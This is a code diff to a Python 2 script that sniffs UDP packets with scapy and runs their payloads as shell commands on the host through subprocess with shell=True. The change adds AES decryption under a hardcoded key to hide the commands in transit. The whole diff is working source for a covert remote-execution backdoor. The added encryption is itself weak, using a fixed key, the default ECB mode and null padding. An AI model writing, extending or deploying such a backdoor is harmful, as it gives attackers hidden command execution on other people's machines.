@@ -1,19 +1,33 @@
 #!/usr/bin/python
 
-import sys, os, argparse, socket, subprocess, logging, time
+import sys, os, argparse, socket, subprocess, logging, time, base64
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 from scapy.all import *
 import subprocess
+from Crypto.Cipher import AES
 
+MASTER_KEY = '12345678901234567890123456789012'
+
+def encrypt(data):
+  secret = AES.new(MASTER_KEY)
+  tagString = str(data) + (AES.block_size - len(str(data)) % AES.block_size) * "\0"
+  cipherText = base64.b64encode(secret.encrypt(tagString))
+  return cipherText
+
+def decrypt(encryptedData):
+  secret = AES.new(MASTER_KEY)
+  rawDecrypted = secret.decrypt(base64.b64decode(encryptedData))
+  data = rawDecrypted.rstrip("\0")
+  return data
 
 FILTER = "udp and (dst port 80) and (src port 8000)"
 
 
 def remoteExecute(pkt):
     print "==============================================="
-    command = pkt['Raw'].load
+    command = decrypt(pkt['Raw'].load)
     print command
-    print ""
+    print "==============================================="
 
     variable = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     ouput = "\nOUTPUT:\n" + variable.stdout.read() + variable.stderr.read()
